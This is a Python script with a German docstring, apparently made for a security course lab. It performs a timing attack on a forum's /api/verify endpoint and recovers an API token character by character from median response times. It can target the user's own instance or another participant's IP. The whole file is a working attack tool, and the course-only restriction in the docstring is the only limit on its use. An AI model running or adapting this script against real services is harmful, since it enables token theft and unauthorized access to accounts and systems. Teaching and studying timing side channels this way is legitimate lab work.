"""Timing-Attack gegen /api/verify eines Cowboy-Forums.

Errät das API-Token Zeichen für Zeichen, indem es misst, bei welchem nächsten
Zeichen die Antwort am längsten dauert (= ein weiteres Zeichen war korrekt).

Kurs-Setup: Ziel ist frei wählbar (eigene Instanz oder Mitspieler im Kurs-Netz).

    pip install requests
    python attack_timing.py                                  # eigene Instanz
    python attack_timing.py --base http://192.168.1.42:5000  # Mitspieler
    python attack_timing.py --len 6 --samples 9              # mehr Messungen bei Rauschen

Nur im Kurs-Netz und nur gegen Lab-Instanzen von Leuten, die mitspielen.
"""
import argparse
import os
import statistics
import string
import time

import requests

ALPHABET = string.ascii_letters + string.digits


def measure(url: str, candidate: str, samples: int) -> float:
    times = []
    for _ in range(samples):
        t0 = time.perf_counter()
        requests.get(url, params={"token": candidate})
        times.append(time.perf_counter() - t0)
    return statistics.median(times)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=os.environ.get("TARGET_URL", "http://127.0.0.1:5000"),
                    help="Ziel-URL, z. B. http://192.168.1.42:5000")
    ap.add_argument("--len", type=int, default=6, help="Token-Länge")
    ap.add_argument("--samples", type=int, default=5, help="Messungen pro Kandidat")
    args = ap.parse_args()
    url = args.base.rstrip("/") + "/api/verify"
    print(f"[*] Ziel: {url}")

    known = ""
    for _ in range(args.len):
        best_char, best_time = None, -1.0
        for ch in ALPHABET:
            # Rest mit 'x' auffüllen, damit die Länge stimmt.
            guess = (known + ch).ljust(args.len, "x")
            dt = measure(url, guess, args.samples)
            if dt > best_time:
                best_time, best_char = dt, ch
        known += best_char
        print(f"bisher: {known!r}  (langsamster nächster Buchstabe = korrekt)")
    print(f"\n[+] Vermutetes Token: {known!r}")


if __name__ == "__main__":
    main()
